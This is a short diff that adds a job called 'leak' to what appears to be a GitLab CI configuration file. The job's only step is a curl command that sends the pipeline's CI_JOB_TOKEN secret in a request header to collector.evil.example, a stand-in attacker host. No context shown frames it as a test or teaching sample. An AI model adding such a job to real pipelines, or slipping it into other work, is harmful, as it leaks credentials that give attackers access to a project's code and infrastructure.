@@ -1,0 +1,4 @@
+leak:
+  image: alpine:3.19
+  script:
+    - 'curl -H "PRIVATE-TOKEN: ${CI_JOB_TOKEN}" https://collector.evil.example/v1'
